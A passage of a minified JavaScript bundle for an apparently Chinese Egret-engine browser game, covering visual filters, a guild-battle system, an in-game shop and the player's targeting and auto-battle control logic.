egret.ColorMatrixFilter([.3086,.5,.082,0,0,.3086,.5,.082,0,0,.3086,.5,.082,0,0,0,0,0,1,0])},enumerable:!1,configurable:!0}),Object.defineProperty(t,"ARRAY_GRAY_FILTER",{get:function(){return[t.grayFilter1]},enumerable:!1,configurable:!0}),Object.defineProperty(t,"greenFilter",{get:function(){return new egret.ColorMatrixFilter([1,0,0,0,0,0,1,0,0,100,0,0,1,0,0,0,0,0,1,0])},enumerable:!1,configurable:!0}),Object.defineProperty(t,"greenFilter1",{get:function(){return new egret.ColorMatrixFilter([.1,0,0,0,0,0,.80078125,0,0,20,0,0,-1,0,0,0,0,0,1,0])},enumerable:!1,configurable:!0}),Object.defineProperty(t,"ARRAY_GREEN_FILTER",{get:function(){return[t.greenFilter1]},enumerable:!1,configurable:!0}),Object.defineProperty(t,"blurFilter",{get:function(){return new egret.BlurFilter(10,10,egret.BitmapFilterQuality.MEDIUM)},enumerable:!1,configurable:!0}),Object.defineProperty(t,"ARRAY_BLUR_FILTER",{get:function(){return[t.blurFilter]},enumerable:!1,configurable:!0}),Object.defineProperty(t,"normalColor",{get:function(){return[this.colorFlilter]},enumerable:!1,configurable:!0}),t.returnColorFilter=function(t){switch(t){case 0:return this.COLORLIGHT_0;case 1:return this.COLORLIGHT_1;case 2:return this.COLORLIGHT_2;case 3:return this.COLORLIGHT_3;case 4:return this.COLORLIGHT_4;case 5:return this.COLORLIGHT_5;case 6:return this.COLORLIGHT_6}},t.colorFlilter=new egret.ColorMatrixFilter([1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0]),t.COLORLIGHT_0=new egret.GlowFilter(15329769,.2,5,5,5,0,!0,!0),t.COLORLIGHT_1=new egret.GlowFilter(4587386,.2,5,5,5,0,!0,!0),t.COLORLIGHT_2=new egret.GlowFilter(3005183,.2,5,5,5,0,!0,!0),t.COLORLIGHT_3=new egret.GlowFilter(15939071,.2,5,5,5,0,!0,!0),t.COLORLIGHT_4=new egret.GlowFilter(16733184,.2,5,5,5,0,!0,!0),t.COLORLIGHT_5=new egret.GlowFilter(16711680,.2,5,5,5,0,!0,!0),t.COLORLIGHT_6=new egret.GlowFilter(16757760,.2,5,5,5,0,!0,!0),t}();e.FilterUtil=n,window.FilterUtil=n,__reflect(n.prototype,"FilterUtil",[]),window.FilterUtil=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BaseClass=void 0;var n=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.ins=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=this;return i._instance||(i._instance=new(i.bind.apply(i,__spreadArrays([void 0],t)))),i._instance},e}(egret.HashObject);e.BaseClass=n,window.BaseClass=n,__reflect(n.prototype,"BaseClass",[]),window.BaseClass=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleCT=void 0;var n=i(14),o=i(17),s=i(0),a=i(20),r=i(214),l=i(7),h=i(2),u=i(328),p=i(215),d=i(299),c=i(695),f=function(t){function e(){var e=t.call(this)||this;return e.enterRp=new o.RedPoint,e.dailyRewardRp=new o.RedPoint,e.rewardAllotRp=new o.RedPoint,e.canClickEnter=!0,e.enterSceneTime=0,e.sceneId=0,e.sysId=PackageID.NewGuildBattle,e.regNetMsg(4,e.postJoinPlayBack),e.regNetMsg(5,e.doPlayNextCard),e.regNetMsg(6,e.doGetPointInfo),e.regNetMsg(7,e.doGetGongXunChange),e.regNetMsg(8,e.doGuildRankinfo),e.regNetMsg(9,e.postGuildPersonalRank),e.regNetMsg(10,e.doGuildWarKillInfo),e.regNetMsg(12,e.postSigninInfo),e.regNetMsg(14,e.doMyActivityRankInfo),e.regNetMsg(15,e.postFlagInfoChange),e.regNetMsg(17,e.doGuildWarResult),e.regNetMsg(18,e.doHuDunInfoChange),e.regNetMsg(19,e.postAllotReward),e.regNetMsg(20,e.postSendAllotResult),e.regNetMsg(21,e.postWinGuildInfo),e.regNetMsg(22,e.postGuildWarStarInfo),e.regNetMsg(23,e.doGuildWarDoorHuDun),e.regNetMsg(24,e.doLotteryInfo),e.regNetMsg(25,e.doGetMyPoint),e.regNetMsg(31,e.doDoorEndtime),e.regNetMsg(32,e.doTalkMaxPoint),e.regNetMsg(33,e.postKillHuman),e.initRps(),e}return __extends(e,t),e.prototype.initRps=function(){var t=this,e=new o.RedPoint(function(){return t.getModel().countEnterRp()},this.postGuildWarStarInfo);this.enterRp.addSub(e);var i=new o.RedPoint(function(){return t.getModel().countDailyRewardRp()},this.postWinGuildInfo,this.postSigninInfo);this.dailyRewardRp.addSub(i);var n=new o.RedPoint(function(){return t.getModel().countRewardAllotRp()},this.postAllotReward);this.rewardAllotRp.addSub(n)},e.prototype.initLogin=function(){e.ins().reqWinGuildInfo(),e.ins().reqGuildRank(),e.ins().reqRewardAllotInfo(),e.ins().reqSigninReward()},e.ins=function(){return t.ins.call(this)},e.prototype.getModel=function(){return this._guildBattleModel||(this._guildBattleModel=new c.GuildBattleModel),this._guildBattleModel},e.prototype.requestSendRedBag=function(t,e){var i=this.getBytes(2);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.requestRobRedBag=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.reqJoinAc=function(){var t=this;if(!this.canClickEnter)return void h.TipsCT.ins().showTips(gettext("正在进入沙城争霸"));Timer.start(4e3,1,function(){t.canClickEnter=!0},this),this.canClickEnter=!1;var e=this.getBytes(4);this.sendToServer(e)},e.prototype.postJoinPlayBack=function(t){var e=t.readBoolean();this.getModel().doorDie=t.readBoolean(),e&&(win.close(p.GuildBattleWin),win.close(r.GuildMap),this.enterSceneTime=l.GameServerCC.serverTime,this.sceneId=1)},e.prototype.requestPlayNextMap=function(t){var e=this.getBytes(5);e.writeByte(t),this.sendToServer(e)},e.prototype.doPlayNextCard=function(t){var e=t.readInt(),i=t.readByte();0==e&&(this.enterSceneTime=l.GameServerCC.serverTime,this.sceneId=i)},e.prototype.doGetPointInfo=function(t){this.getModel().ownPoint=t.readInt(),this.getModel().guildPoint=t.readInt();var e=t.readInt();e>0&&h.TipsCT.ins().showTips(gettext("获得 {0} 积分",e)),this.postPointUpdate()},e.prototype.doGetGongXunChange=function(t){this.getModel().gongXun=t.readInt(),this.postPointUpdate()},e.prototype.reqGuildRank=function(){var t=this.getBytes(8);this.sendToServer(t)},e.prototype.doGuildRankinfo=function(t){this.getModel().decodeGuildRankInfo(t,0)},e.prototype.requestOwnGuildRank=function(){var t=this.getBytes(9);this.sendToServer(t)},e.prototype.postGuildPersonalRank=function(t){var e=[];this.getModel().personRankList=[];for(var i=t.readInt(),n=0;i>n;n++){var o=new c.RankGuildInfo;o.parse(t,1),e[n]=o,this.getModel().personRankList[n]=o}return e},e.prototype.doGuildWarKillInfo=function(t){var e=t.readInt(),i=t.readString(),n=i.split("_");if("0"==n[0])this.getModel().killName=n[1];else{var o=s.GlobalConfig.MonstersConfig[+n[1]];this.getModel().killName=o?o.name:""}this.getModel().killGuild=t.readString(),this.getModel().gongXun=0,this.postPointUpdate(),win.open(d.GuileBattleReliveWin,2,e)},e.prototype.reqSigninReward=function(){var t=this.getBytes(12);this.sendToServer(t)},e.prototype.postSigninInfo=function(t){this.getModel().singinStatus=t.readByte()},e.prototype.requestDayReward=function(){var t=this.getBytes(13);this.sendToServer(t)},e.prototype.requestOwnMyGuildRank=function(){var t=this.getBytes(14);this.sendToServer(t)},e.prototype.doMyActivityRankInfo=function(t){this.getModel().decodeMyGuildRankInfo(t)},e.prototype.postFlagInfoChange=function(t){this.getModel().flagStatu=t.readByte(),0==this.getModel().flagStatu?(this.getModel().endTime=t.readInt(),this.getModel().flagGuild=void 0):1==this.getModel().flagStatu?this.getModel().flagGuild=void 0:2==this.getModel().flagStatu?(this.getModel().endTime=t.readInt(),this.getModel().flagGuild=t.readString()):3==this.getModel().flagStatu},e.prototype.doGuildWarResult=function(t){this.getModel().decodeGulidWarResult(t)},e.prototype.doHuDunInfoChange=function(t){this.postHudunInfo(t.readInt(),t.readInt())},e.prototype.reqRewardAllotInfo=function(){var t=this.getBytes(19);this.sendToServer(t)},e.prototype.postAllotReward=function(t){var i=t.readByte();if(e.ins().getModel().guildRank=i,0!=i){this.getModel().allotInfoList={};for(var n=t.readShort(),o=0;n>o;o++){var s=new c.AllotInfo;s.parse(t),this.getModel().allotInfoList[i]||(this.getModel().allotInfoList[i]=[]),this.getModel().allotInfoList[i][s.id]||(this.getModel().allotInfoList[i][s.id]=[]),this.getModel().allotInfoList[i][s.id].push(s)}}},e.prototype.reqAllotReward=function(t){var e=this.getBytes(20),i=t.length;e.writeShort(i);for(var n=0;i>n;n++){var o=t[n];e.writeByte(o.id);var s=o.arr.length;e.writeShort(s);for(var a=0;s>a;a++)e.writeInt(o.arr[a].actorId),e.writeShort(o.arr[a].cnt)}this.sendToServer(e)},e.prototype.postSendAllotResult=function(t){t.readBoolean()&&(win.close(u.GuildBattleRewardAllocateWin),h.TipsCT.ins().showTips(gettext("分配成功")),console.log("........."))},e.prototype.reqWinGuildInfo=function(){var t=this.getBytes(21);this.sendToServer(t)},e.prototype.postWinGuildInfo=function(t){this.getModel().winGuildInfo||(this.getModel().winGuildInfo=new c.WinGuildInfo),this.getModel().winGuildInfo.parse(t)},e.prototype.postGuildWarStarInfo=function(t){this.getModel().isWatStart=t.readBoolean();var e=t.readInt();this.getModel().actLeftTime=e,this.getModel().actEndTime=l.GameServerCC.serverTime+1e3*e},e.prototype.doGuildWarDoorHuDun=function(t){this.getModel().doorShieldLeft=t.readInt()},e.prototype.doLotteryInfo=function(t){t.readInt(),t.readInt()},e.prototype.reqPlayLotteryInfo=function(){var t=this.getBytes(25);this.sendToServer(t)},e.prototype.doGetMyPoint=function(t){t.readShort()},e.prototype.doDoorEndtime=function(t){this.getModel().doEndDoorTime(t.readByte())},e.prototype.doTalkMaxPoint=function(t){t.readInt(),t.readString()},e.prototype.postKillHuman=function(t){var e=t.readInt();return e},e.prototype.guildBattleEnd=function(){},e.prototype.doRankInfoChange=function(t){this.getModel().rankListChange(t)},e.prototype.doChangeAttrHandle=function(t){if(14==a.GameMap.fbType){var e=t.readDouble();this.getModel().attHandle!=e&&(this.getModel().attHandle=e),this.postWeixieChange(1)}},e.prototype.doChangeShowList=function(t){if(14==a.GameMap.fbType){var e=t.readDouble();this.getModel().changeWeiXieList(e,!1),this.getModel().changecanPlayList(e,!1),this.getModel().setMyGuildNum(e,!1),this.getModel().attHandle&&this.getModel().attHandle==e&&(this.getModel().attHandle=0,console.log("cancel------------:"+e))}},e.prototype.doPointRewardInfo=function(t){this.getModel().decodePointRewardInfo(t)},e.prototype.postLotteryPoint=function(t){return t},e.prototype.sendBaseProto=function(t){throw new Error("Method not implemented.")},e.prototype.postLotteryMaxPost=function(t,e){return[t,e]},e.prototype.postMyRankChange=function(){return 1},e.prototype.postPointRewardChange=function(){},e.prototype.postCanplayChange=function(){},e.prototype.postRankListChange=function(){},e.prototype.postGuildNumChange=function(){},e.prototype.postSendListChange=function(){},e.prototype.postGuildRankInfo=function(){return 0},e.prototype.postRedBagInfo=function(t){this.getModel().getRedbagInfo(t)},e.prototype.doSendRedBack=function(t){t.readBoolean()&&(win.close("RedBagWin"),h.TipsCT.ins().showTips(gettext("|C:0x35e62d&T:发送红包成功|")))},e.prototype.doRobRedBack=function(t){t.readBoolean()&&(win.close("RedBagWin"),win.open("RedBagDetailsWin",1))},e.prototype.postPointUpdate=function(){},e.prototype.postCityownChange=function(){},e.prototype.postHudunInfo=function(t,e){return[t,e]},e.prototype.postWeixieChange=function(t){return t},e.prototype.postGuildRedPointChange=function(t){return t},__decorate([post()],e.prototype,"postJoinPlayBack",null),__decorate([post()],e.prototype,"postGuildPersonalRank",null),__decorate([post()],e.prototype,"postSigninInfo",null),__decorate([post()],e.prototype,"postFlagInfoChange",null),__decorate([post()],e.prototype,"postAllotReward",null),__decorate([post()],e.prototype,"postSendAllotResult",null),__decorate([post()],e.prototype,"postWinGuildInfo",null),__decorate([post()],e.prototype,"postGuildWarStarInfo",null),__decorate([post()],e.prototype,"postKillHuman",null),__decorate([post()],e.prototype,"guildBattleEnd",null),__decorate([post()],e.prototype,"postLotteryPoint",null),__decorate([post()],e.prototype,"postLotteryMaxPost",null),__decorate([post()],e.prototype,"postMyRankChange",null),__decorate([post()],e.prototype,"postPointRewardChange",null),__decorate([post()],e.prototype,"postCanplayChange",null),__decorate([post()],e.prototype,"postRankListChange",null),__decorate([post()],e.prototype,"postGuildNumChange",null),__decorate([post()],e.prototype,"postSendListChange",null),__decorate([post()],e.prototype,"postGuildRankInfo",null),__decorate([post()],e.prototype,"postRedBagInfo",null),__decorate([post()],e.prototype,"postPointUpdate",null),__decorate([post()],e.prototype,"postCityownChange",null),__decorate([post()],e.prototype,"postHudunInfo",null),__decorate([post()],e.prototype,"postWeixieChange",null),__decorate([post()],e.prototype,"postGuildRedPointChange",null),e}(n.BaseSystem);e.GuildBattleCT=f,window.GuildBattleCT=f,__reflect(f.prototype,"GuildBattleCT",[]),Systemap.GuildBattleCT=function(){return f.ins()},window.GuildBattleCT=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopHadBuyData=e.ShopEquipData=e.ShopData=e.Shop=void 0;var n=i(14),o=i(168),s=i(0),a=i(91),r=i(4),l=i(2),h=i(40),u=function(t){function e(){var e=t.call(this)||this;return e.dartData=[],e.weekLimitDatas={},e.weekLoopLimitDatas={},e.shopData=new p,e.sysId=PackageID.Shop,e.regNetMsg(1,e.postUpdateShopData),e.regNetMsg(2,e.postBuyResult),e.regNetMsg(3,e.postBuyCount),e.regNetMsg(4,e.refreshGoodsSuccess),e.regNetMsg(5,e.postRefreshIntegrationSucc),e.regNetMsg(6,e.updateMedalMessage),e.regNetMsg(7,e.postUpdateBuyMedal),e.regNetMsg(8,e.postWeekLimitDatas),e.regNetMsg(9,e.postWeekLimitData),e.regNetMsg(10,e.postAllDartData),e.regNetMsg(11,e.postDartData),e.regNetMsg(16,e.onDailyGiftData),e.regNetMsg(17,e.onGoldAdCount),e.regNetMsg(19,e.postWeekLoopLimitDatas),e.regNetMsg(20,e.postWeekLoopLimitData),e}return __extends(e,t),e.prototype.onDailyGiftData=function(t){this.dayliyData=[];for(var e=t.readInt(),i=0;e>i;i++){var n=t.readInt(),o={lastTime:n};this.dayliyData.push(o)}this.postDailyGift()},e.prototype.postDailyGift=function(){},e.prototype.sendDailyGift=function(){var t=this.getBytes(16);this.sendToServer(t)},e.ins=function(){return t.ins.call(this)},e.prototype.sendBuy=function(t,e){var i=this.getBytes(2);i.writeInt(t),i.writeInt(e.length),this.shopBuyArr=[];for(var n=0;n<e.length;n++){i.writeInt(e[n][0]),i.writeInt(e[n][1]);var o=s.GlobalConfig.ItemStoreConfig[e[n][0]];if(o&&o.itemId==a.ItemConst.GOLD_BRICK){var r={id:a.ItemConst.GOLD_BRICK,count:e[n][1]};this.shopBuyArr.push(r)}}this.sendToServer(i)},e.prototype.sendRefreshShop=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.postUpdateShopData=function(t){e.ins().shopData.parser(t)},e.prototype.postBuyResult=function(t){var e=t.readInt();return e},e.prototype.postBuyCount=function(t){e.ins().shopData.parserBuyCount(t)},e.prototype.refreshGoodsSuccess=function(t){this.postRefreshGoodsSuccess(!0)},e.prototype.postRefreshGoodsSuccess=function(t){return t},e.prototype.postRefreshIntegrationSucc=function(t){var i=t.readBoolean();t.readInt();return[i,e.ins().shopData.point]},e.prototype.sendIntegrationShop=function(t){var e=this.getBytes(5);e.writeInt(t),this.sendToServer(e)},e.prototype.sendMedalMessage=function(){var t=this.getBytes(6);this.sendToServer(t)},e.prototype.updateMedalMessage=function(t){var i=t.readInt();this.medalData=new o.FeatsStoreData(i,t),e.ins().postRefresMedalMessage()},e.prototype.postRefresMedalMessage=function(){},e.prototype.sendBuyMedal=function(t,e){var i=this.getBytes(7);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postUpdateBuyMedal=function(t){var e=t.readInt(),i=t.readInt();return[e,i]},e.prototype.postAllDartData=function(t){var e=t.readInt();this.dartData=[];for(var i=0;e>i;i++)this.dartData[t.readUnsignedInt()]=t.readUnsignedInt()},e.prototype.postDartData=function(t){this.dartData[t.readUnsignedInt()]=t.readUnsignedInt()},e.prototype.sendBuyDart=function(t,e){var i=this.getBytes(11);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.getDartBuyNumById=function(t){return this.dartData[t]||0},e.openBuyGoldWin=function(t){void 0===t&&(t=!0);var n=e.ins().shopData.getGoodsIdByItemId(200164);return e.ins().shopData.checkBuyGoodsId(n,t)?(Promise.resolve().then(function(){return i(229)}).then(function(t){return win.open("BuyWin",n)}),!0):!1},e.prototype.postWeekLimitDatas=function(t){var e=t.readInt();this.weekLimitDatas={};for(var i=0;e>i;i++)this.weekLimitDatas[t.readInt()]=t.readInt()},e.prototype.postWeekLimitData=function(t){this.weekLimitDatas[t.readInt()]=t.readInt()},e.prototype.sendBuyWeekLimit=function(t,e){var i=this.getBytes(9);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.getWeekNumById=function(t){return this.weekLimitDatas[t]||0},e.prototype.postWeekLoopLimitDatas=function(t){var e=t.readInt();this.weekLoopLimitDatas={};for(var i=0;e>i;i++)this.weekLoopLimitDatas[t.readInt()]={idx:t.readInt()-1,count:t.readInt()};this.postWeekLoopLimit()},e.prototype.postWeekLoopLimitData=function(t){var e=t.readInt();this.weekLoopLimitDatas[e]&&(this.weekLoopLimitDatas[e].count=t.readInt()),this.postWeekLoopLimit()},e.prototype.postWeekLoopLimit=function(){},e.prototype.sendBuyWeekLoopLimit=function(t,e){var i=this.getBytes(20);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.getStoreByItemID=function(t){var e=s.GlobalConfig.ItemStoreConfig;for(var i in e){var n=e[i];if(n.itemId==t)return n}return null},e.prototype.onGoldAdCount=function(t){var e=t.readByte();return e||0},e.prototype.sendGoldAdCount=function(){var t=this.getBytes(17);this.sendToServer(t)},e.prototype.sendBuyGold=function(t){var e=this.getBytes(18);e.writeByte(t),this.sendToServer(e)},__decorate([post()],e.prototype,"postDailyGift",null),__decorate([post()],e.prototype,"postUpdateShopData",null),__decorate([post()],e.prototype,"postBuyResult",null),__decorate([post()],e.prototype,"postBuyCount",null),__decorate([post()],e.prototype,"postRefreshGoodsSuccess",null),__decorate([post()],e.prototype,"postRefreshIntegrationSucc",null),__decorate([post()],e.prototype,"postRefresMedalMessage",null),__decorate([post()],e.prototype,"postUpdateBuyMedal",null),__decorate([post()],e.prototype,"postAllDartData",null),__decorate([post()],e.prototype,"postDartData",null),__decorate([post()],e.prototype,"postWeekLimitDatas",null),__decorate([post()],e.prototype,"postWeekLimitData",null),__decorate([post()],e.prototype,"postWeekLoopLimit",null),__decorate([post()],e.prototype,"onGoldAdCount",null),e}(n.BaseSystem);e.Shop=u,window.Shop=u,__reflect(u.prototype,"Shop",[]);var p=function(t){function e(){var e=t.call(this)||this;return e.shopEquipData=[],e.hadBuyCount=[],e}return __extends(e,t),Object.defineProperty(e.prototype,"refushTime",{get:function(){return this._refushTime},set:function(t){this._refushTime=t,Timer.stopAll(this),t>0&&Timer.start(1e3,t,this.enterTime,this)},enumerable:!1,configurable:!0}),e.prototype.parser=function(t){this.shopEquipData.length=0,this.refushTime=t.readInt(),this.point=t.readInt(),this.times=t.readInt();for(var e=t.readInt(),i=0;e>i;i++){var n=new d;n.parser(t),this.shopEquipData.push(n)}},e.prototype.parserBuyCount=function(t){var e=t.readShort();this.hadBuyCount.length=0;for(var i=0;e>i;i++){var n=new c;n.parser(t),this.hadBuyCount.push(n)}},e.prototype.enterTime=function(){this._refushTime<=0?this._refushTime=0:this._refushTime--},e.prototype.getHadBuyCountItem=function(t){for(var e=0,i=this.hadBuyCount;e<i.length;e++){var n=i[e];if(n.itemId==t)return n}return null},e.prototype.getHadBuyCount=function(t){var e=this.getHadBuyCountItem(t);return e?e.count:0},e.prototype.getShopEquipDataLength=function(){var t=0;return null!=this.shopEquipData&&(t=this.shopEquipData.length),t},e.prototype.getShopEquipDataByIndex=function(t){var e=null;return null!=this.shopEquipData&&t>=0&&t<this.shopEquipData.length&&(e=this.shopEquipData[t]),e},e.prototype.getShopEquipDataById=function(t){for(var e=0,i=this.shopEquipData;e<i.length;e++){var n=i[e];if(n.id==t)return n}return null},e.prototype.checkBuyGoodsId=function(t,e){void 0===e&&(e=!0);var i=s.GlobalConfig.ItemStoreConfig[t];if(i){if(i.viplv&&r.ActorCC.vip<i.viplv)return!1;if(i.vipLimit){var n=i.vipLimit[r.ActorCC.vip],o=this.getHadBuyCount(i.itemId);if(o>=n)return e&&l.TipsCT.ins().showTips(gettext("今日购买次数已用完")),!1}}return!0},e.prototype.getGoodsIdByItemId=function(t){for(var e in s.GlobalConfig.ItemStoreConfig)if(s.GlobalConfig.ItemStoreConfig[e].itemId==t)return parseInt(e);return 0},e}(egret.HashObject);e.ShopData=p,window.ShopData=p,__reflect(p.prototype,"ShopData",[]);var d=function(){function t(){}return t.prototype.parser=function(t){this.id=t.readInt(),this.costType=t.readInt(),this.costNum=t.readInt(),this.discountType=t.readInt(),this.item=new h.ItemData,this.item.parser(t)},t.discountDic={0:{discount:1,res:""},1:{discount:.8,res:"shangzk8"},2:{discount:.5,res:"shangzk5"}},t}();e.ShopEquipData=d,window.ShopEquipData=d,__reflect(d.prototype,"ShopEquipData",[]);var c=function(){function t(){}return t.prototype.parser=function(t){this.itemId=t.readInt(),this.count=t.readInt()},t}();e.ShopHadBuyData=c,window.ShopHadBuyData=c,__reflect(c.prototype,"ShopHadBuyData",[]),Systemap.Shop=function(){return u.ins()},window.Shop=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ControlCC=e.CommandEnum=void 0;var n=i(101),o=i(146),s=i(34),a=i(13),r=i(122),l=i(37),h=i(0),u=i(288),p=i(2),d=i(105),c=i(100),f=i(43),g=i(23),m=i(339),v=function(t){function i(){var i=t.call(this)||this;return i.isHideFightingEff=!1,i.isHideBloodEff=!1,i.isAutoSelHighQuaMon=!1,i.isHideWingEff=!1,i.isHideNoticeKillDrop=!1,i.autoing=!1,i._isAuto=!1,i._isAutoUseSkill=!1,i.lastUseTime=0,i.lastEnemy=0,i.startMoveTime=-1,i.isCanUsePetSkill=!0,i.intervalArr=[],i._actSkillDic={},i.commands=[],i.isExe=!1,observe(i,function(t){var e;i.curTar&&(null===(e=i.curTar)||void 0===e?void 0:e.infoModel)||i.setCurTar(null),i.curTar&&t==i.curTar.infoModel.handle&&i.setCurTar(null),t==i.lastEnemy&&(i.lastEnemy=0);var n=l.EntityManager.ins().getEntityByHandle(t);n&&n.data&&n.data.type==EntityType.Pet&&n.data.masterHandle==a.SubRoles.lookAtTar.data.handle&&(i.isCanUsePetSkill=!0,urlParam.debugTS&&console.log("@@后端移除我的宠物--"))},Ts.removeEntity),observe(i,function(){console.log("@@收到后端切换场景"),i.setCurTar(null),i.lastEnemy=0,i.commands.length=0,i.curXY=null,i.isExe=!1,i.setAuto(!1),i.resolveMove&&(urlParam.debugTS&&console.log("----切换场景,执行挂起的resolveMove函数----"),i.resolveMove(),i.resolveMove=null),i.isCanUsePetSkill=!0},Ts.enterScene),observe(i,function(){e.ControlCC.setAuto(!1),i.setCurTar(null)},Ts.actorDie),i}return __extends(i,t),Object.defineProperty(i.prototype,"gameFrameRate",{set:function(t){var e=egret.MainContext.instance.stage;e.frameRate=t},enumerable:!1,configurable:!0}),i.prototype.onAddEntity=function(t){t.type==EntityType.Pet&&a.SubRoles.lookAtTar&&a.SubRoles.lookAtTar.data.handle==t.masterHandle&&(urlParam.debugTS&&console.log("@@后端添加我的宠物++"),this.isCanUsePetSkill=!1)},i.prototype.setAtuoUseSkill=function(t){this._isAutoUseSkill=t},Object.defineProperty(i.prototype,"isAuto",{get:function(){return this._isAuto},enumerable:!1,configurable:!0}),i.prototype.setAuto=function(t){if(t){if(!a.SubRoles.lookAtTar)return;if(a.SubRoles.lookAtTar.isDie())return}return this._isAutoUseSkill&&this.setAtuoUseSkill(!1),this._isAuto==t?null:(this._isAuto=t,console.log("----setAuto=",t),void(t?this.autoAtkAndKill():(this.commands.length=0,this.autoing=!1,this.resolveMove&&(urlParam.debugTS&&console.log("----setAuto取消自动战斗,执行挂起的resolveMove函数----"),this.resolveMove(),this.resolveMove=null))))},Object.defineProperty(i.prototype,"curTar",{get:function(){return this._curTar},enumerable:!1,configurable:!0}),i.prototype.setCurTar=function(t){this._curTar!=t&&(t&&(t.data.isFriend()?(urlParam.debugTS&&console.log("@@选中友方"),this._curTar&&!this._curTar.data.isFriend()&&(this.lastEnemy=this._curTar.data.handle,urlParam.debugTS&&console.log("@@记录上一个敌人=",this.lastEnemy))):(urlParam.debugTS&&console.log("@@选中敌人name=",t.data.name," Entity=",t),g.GameLogic.ins().postChangeAttrPoint(t.data.handle))),this._curTar=t)},i.prototype.setChangeTarget=function(t){t&&(t.data.isFriend()||g.GameLogic.ins().postChangeAttrPoint(t.data.handle))},i.prototype.sendMove=function(t,e){var i;observe(this,this.startNextMove,g.GameLogic.ins().postMeMove),observe(this,this.moveResult,g.GameLogic.ins().moveResult);var n=null===(i=null===t||void 0===t?void 0:t.infoModel)||void 0===i?void 0:i.handle;return n?(urlParam.debugTS&&console.log("@@发送移动协议,目标点=",e.x,e.y),g.GameLogic.ins().find3v3Question("点击地板请求移动 pppppp1111112222-请求移动"),void send(Ts.move,{handle:n,path:[e]})):void console.error("ControlCC-sendMove-handle",n)},i.prototype.startNextMove=function(){this.resolveMove&&(urlParam.debugTS&&console.log("----执行resolveMove"),this.resolveMove(),this.resolveMove=null)},i.prototype.moveResult=function(t){var e=t[0];if(!e){var i=t[1],n=t[2];console.error("@@后端返回移动失败,强制同步当前位置=",i,n),a.SubRoles.lookAtTar&&(a.SubRoles.lookAtTar.x=c.mainfightcc.gridToX(i),a.SubRoles.lookAtTar.y=c.mainfightcc.gridToY(n),a.SubRoles.lookAtTar.data.gridX=i,a.SubRoles.lookAtTar.data.gridY=n),this.startNextMove()}},i.prototype.atkAndKill=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n;return __generator(this,function(o){switch(o.label){case 0:if(console.error("@@atkAndKill这里真的会执行么????"),t&&(this.skill=t),this.isAuto)return[2];if(this.curTar&&!d.CampCC.canAtk(this.curTar))return p.TipsCT.ins().showCenterTips(gettext("当前攻击模式下不能对该玩家造成伤害")),[2];o.label=1;case 1:return a.SubRoles.lookAtTar?(e=this.skill&&this.skill.canUse?this.skill:this.findSkill())?[3,3]:(console.log("没有可以使用的技能1"),[4,sheep(50)]):[3,5];case 2:return o.sent(),[3,1];case 3:return i=this.needFindAgainTarget(e.castType,this.curTar),i&&(n=l.EntityManager.ins().find(a.SubRoles.lookAtTar,EntityType.Monster,e.castType,!0,!1,null,e.castRange)||l.EntityManager.ins().find(a.SubRoles.lookAtTar,EntityType.Role,e.castType,!0,!0,null,e.castRange),this.setCurTar(n)),this.commands.length?[3,5]:[4,this.pushCommand(y.atk,{tar:this.curTar,skill:e})];case 4:return o.sent(),this.commands.length?[3,5]:!this.curTar||this.curTar.isDie()?[3,5]:this.isAuto?[3,5]:this.curTar?[3,1]:[3,5];case 5:return[2]}})})},i.prototype.autoAtkAndKill=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,n,o,s,r,h,p,d;return __generator(this,function(c){switch(c.label){case 0:if(this.autoing)return[2];this.autoing=!0,urlParam.debugTS&&console.log("-------autoAtkAndKill------"),t=egret.getTimer(),e=!1,c.label=1;case 1:return urlParam.debugTS&&console.log("--开始新一轮循环--"),e&&(t=egret.getTimer(),e=!1),this.isAuto?a.SubRoles.lookAtTar&&a.SubRoles.lookAtTar.infoModel?[3,3]:(console.log("----lookAtTar.infoModel找不到了,等待1000ms----"),[4,sheep(50)]):[3,13];case 2:return c.sent(),[3,1];case 3:return i=a.SubRoles.lookAtTar.infoModel.publicCD(),n=this.lastUseTime+i-egret.getTimer(),n>0?(urlParam.debugTS&&console.log("-------等待GCD结束------",n),[4,sheep(n)]):[3,5];case 4:return c.sent(),[3,1];case 5:return(o=this.skill&&this.skill.canUse?this.skill:this.findSkill())?[3,7]:(console.log("----没有可以使用的技能,等待100ms----"),[4,sheep(50)]);case 6:return c.sent(),[3,1];case 7:return urlParam.debugTS&&console.log("@@选择技能=",o.name),s=this.needFindAgainTarget(o.castType,this.curTar),s&&(r=void 0,this.lastEnemy&&(r=l.EntityManager.ins().getEntityByHandle(this.lastEnemy)),h=void 0,r&&!this.needFindAgainTarget(o.castType,r)?(urlParam.debugTS&&console.log("@@选中上一个敌人=",r),this.lastEnemy=0,h=r):h=o.castType==u.TargetType.Enemy?l.EntityManager.ins().find(a.SubRoles.lookAtTar,EntityType.Monster,o.castType,!0,!1,null,o.castRange)||l.EntityManager.ins().find(a.SubRoles.lookAtTar,EntityType.Role,o.castType,!0,!0,null,o.castRange):l.EntityManager.ins().find(a.SubRoles.lookAtTar,EntityType.All,o.castType,!0,!0,l.EntityManager.ins().checkEntityCanBeHeal,o.castRange),this.setCurTar(h)),this.curTar?[3,9]:(console.log("@@找不到taget,等待1秒后重新循环"),[4,sheep(50)]);case 8:return c.sent(),[3,1];case 9:return[4,this.pushCommand(y.atk,{tar:this.curTar,skill:o})];case 10:return 